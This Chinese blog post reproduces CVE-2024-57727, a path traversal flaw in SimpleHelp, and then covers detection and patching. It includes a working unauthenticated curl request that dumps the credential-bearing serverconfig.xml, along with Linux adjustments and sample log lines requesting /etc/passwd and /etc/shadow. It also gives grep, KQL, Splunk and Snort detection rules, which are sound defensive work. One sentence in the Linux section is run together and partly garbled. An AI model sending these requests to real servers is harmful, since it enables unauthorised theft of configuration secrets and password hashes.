#  SimpleHelp复现   
 船山信安   2025-05-03 22:12  
  
                                        免责声明  
  
由于传播、利用本博客所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,本博客及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉，谢谢！  
## 介绍  
  
SimpleHelp 是一个促进远程支持、访问和工作以及其他用途的系统。它主要由 IT 专业人员和支持团队使用，以允许他们远程支持其用户。它可以安装在 Linux、MS Windows 和 macOS 服务器上。  
  
https://simple-help.com/  
  
漏洞描述       SimpleHelp远程支持软件版本 v5.5.7 及更早版本存在多个路径遍历漏洞，允许未经身份验证的远程攻击者通过精心设计的 HTTP 请求从 SimpleHelp 主机下载任意文件，包括包含各种机密信息和哈希用户密码的服务器配置文件。  
  
受影响的范围      SimpleHelp v5.5.7 及更早版本  
  
漏洞类型       路径遍历漏洞  
  
在发现影响其他远程支持和远程访问软件的各种漏洞后，Horizon3.ai 出于好奇，决定检查 SimpleHelp 的软件。在他们的博客文章中https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/中，他们声称发现了三个漏洞：CVE-2024–57726、CVE-2024–57727和CVE-2024–57728：  
- CVE-2024-57726 允许权限从技术人员角色升级到      SimpleHelp 服务器管理员角色。  
  
- CVE-2024-57727 是一个路径遍历漏洞，允许从 SimpleHelp     服务器下载任意文件，例如serverconfig.xml  
  
- CVE-2024-57728 允许具有 SimpleHelp 服务器管理员角色的用户将文件上传到主机服务器。换句话说，用户可以创建 crontab 作业文件并将其上传到 Linux 服务器，或覆盖 Windows 服务器上现有的二进制文件以运行他们选择的程序。  
  
SimpleHelp 有三个主要角色：管理员、技术人员和客户。  
- 管理员设置和配置 SimpleHelp 服务器  
  
- 技术人员使用 SimpleHelp 与需要远程支持的客户建立联系  
  
- 客户是寻求帮助的人  
  
## 在MS Windows 上进行利用  
  
CVE-2024-57727   
是一个路径遍历漏洞。在分析补丁（https://rustlang.rs/posts/simple-help/）后，作者“imjdl”发现此漏洞的根本原因在于respondToolboxResource()未检查请求路径的方法。他们用Python 创建了一个概念验证 (PoC) 代码并将其发布在此处（https://github.com/imjdl/CVE-2024-57727）。  
  
MS Windows 上 SimpleHelp 的 PoC  
  
![1744165535_67f5da9f8cd0a6775f496.png!small?1744165537205](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMC2fNFmy1GrduNwf6yJMte5Kqc5uHptsOPxjaxCdfsjrROJnHsryxicibDBwgfvqwlWHPA0dqlpZIw/640?wx_fmt=jpeg&from=appmsg "")  
  
现在我们已经确认目标虚拟机存在漏洞，让我们获取服务器配置文件。一种方法是使用curl。要检查 PoC 使用的 URL，让我们检查一下poc.py。其中一行揭示了漏洞。  
  
def send_path_traversal_request(url: str) -> bool:  
  
# [...]  
  
url = url + "/toolbox-resource/../resource1/../../configuration/serverconfig.xml"  
  
# [...]  
  
当用户尝试访问时，就会发生路径遍历/toolbox-resource/。我们将使用上述 PoC 代码来编写curl命令。  
  
curl --path-as-is http://IP/toolbox-resource/../resource1/../../configuration/serverconfig.xml  
  
注意到我们在命令--path-as-is中添加了curl。此选项可防止在规范化路径的过程中curl删除../。成功执行上述命令将检索serverconfig.xml文件。  
  
![1744166418_67f5de12c5a74efaaabe3.png!small?1744166421594](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMC2fNFmy1GrduNwf6yJMteBrdNnMibfkEVh6ic917rtYU0q7kb3eFHlyzmBWjDaac44FInNehkmGvA/640?wx_fmt=jpeg&from=appmsg "")  
## MS Windows 以外的漏洞利用  
  
Linux 上 SimpleHelp 的 PoC  
  
POC在上面的Windows 上完美运行，但在 Linux 上对 SimpleHelp 不起作用。MS Windows 更“灵活”，即使目录名称错误，也可以让漏洞利用成功。对 Linux 系统上托管的 SimpleHelp 的相同尝试从服务器获得空回复，如下面的终端所示。  
  
![1744166453_67f5de358b489d36f794c.png!small?1744166455201](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMC2fNFmy1GrduNwf6yJMtelsRLsjC8XcxQLjFKJgdCIE4SHJ9RIFvfGQMRFfDGt1lInFAXk1S95w/640?wx_fmt=jpeg&from=appmsg "")  
  
（https://attackerkb.com/topics/G4CTOrbDx0/cve-2024-57727）上由“jheysel-r7”撰写的分析提供了有关如何使其针对 Linux 主机起作用的详细信息。具体来说，我们需要将获取的 URL 中的 替换resource1为有效的目录名，例如。通过在替换目录名后重复相同的命令，我们可以成功转储文件。下面的终端中显示了一个示例。secmsghttp://IP/toolbox-resource/../resource1/../../configuration/serverconfig.xmlcurlresource1serverconfig.xml  
  
![1744166480_67f5de50147c96adb89be.png!small?1744166482015](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMC2fNFmy1GrduNwf6yJMteOicer5x01JtVw1kNR40gmEfnFbrVfQdkgMGpzFSZWOEWpEtXQ1ElARQ/640?wx_fmt=jpeg&from=appmsg "")  
  
其他有效的目录名称也可用。我们在下面的终端中列出了目录。  
  
root@:~# tree -L 1 -d  
  
.  
  
├── alertsdb  
  
├── backups  
  
├── branding  
  
├── history  
  
├── html  
  
├── notifications  
  
├── recordings  
  
├── remotework  
  
├── secmsg  
  
├── simulations  
  
├── sslconfig  
  
├── techprefs  
  
├── templates  
  
├── toolbox  
  
├── toolbox-resources  
  
└── translations  
  
17 directories  
## 检测  
  
SimpleHelp 的CVE-2024-57727 是一个路径遍历漏洞，上面使用各种工具检测此漏洞的滥用情况  
  
为了进行检测，我们将在 Web 服务器日志中寻找路径遍历的迹象（例如，Apache2、Nginx 等）。  
- 表示目录遍历的语法（./& ../）  
  
- 上述语法的 URL 编码版本 ( \%2e\%2e/)  
  
grep -E "(\.\./|\%2e\%2e/)" /var/log/nginx/access.log  
  
攻击者经常利用 URL 编码语法来帮助绕过安全和检测机制。grep下面附上了一个使用示例：  
  
grep -E "(\.\./|\%2e\%2e|%252e%252e)" /var/log/nginx/access.log  
  
xx.xx.xx.xx - - [03/Mar/2025:12:34:56 +0000] "GET /../../etc/passwd HTTP/1.1" 200 -  
  
xx.xx.xxx.xx - - [04/Mar/2025:17:12:10 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/etc/shadow HTTP/1.1" 200 –  
### ELK  
  
如果 Web 服务器日志被提取到SIEM（例如 ELK）中，则可以使用以下 KQL 查询通过上面介绍的相同正则表达式模式来查询路径遍历：http.request.uri.path: (*../* or *%2e%2e* or *%252e%252e*)  
  
此外，可以创建以下检测规则，将“ webserver.dataset  
”替换为相关日志源：event.dataset: "webserver.dataset" and http.request.uri.path: (*../* or *%2e%2e* or *%252e%252e*)  
### Splunk  
  
如果使用 Splunk 作为 SIEM解决方案，则可以在 Splunk 中使用以下查询来查看路径遍历尝试：  
  
index=web_logs ("..%2f" OR "../" OR "%2e%2e%2f")  
  
将索引的名称替换为适合日志源的名称。  
### Snort  
  
Snort 是一种流行的开源入侵检测系统 (IDS)，放置在网络边界，是实时检测路径遍历攻击的好方法。下面附有一条用于检测路径遍历攻击的 Snort 规则  
  
alert tcp any any -> any 80 (msg:"SimpleHelp CVE-2024-57727 Path Traversal Attempt";  
  
flow:to_server,established;  
  
content:"GET"; http_method;  
  
content:"/html/.."; http_uri;  
  
pcre:"/(\.\.\/|%2e%2e\/|%252e%252e\/)/i";  
  
classtype:web-application-attack;  
  
sid:10045727; rev:1;)  
  
当发生路径遍历攻击时，Snort 将发出警报，如以下示例所示：  
  
root@$ sudo snort -A console -q -c /etc/snort/snort.conf -i eth0  
  
[**] [1:10045727:1] SimpleHelp CVE-2024-57727 Path Traversal Attempt [**]  
  
[Priority: 2] {TCP} 172.16.1.1:56789 -> 172.16.1.200:80  
## 修复  
  
SimpleHelp 发布了其旧版本的更新版本和补丁。建议 5.5.7 及更早版本的用户升级到 5.5.8 版本。版本 5.3 和 5.4 的用户应按照官方安全公告（https://simple-help.com/kb---security-vulnerabilities-01-2025#patching-v5-4-10）中的说明修补他们的服务器。  
  
来源：【  
https://www.freebuf.com/articles/web】  
  
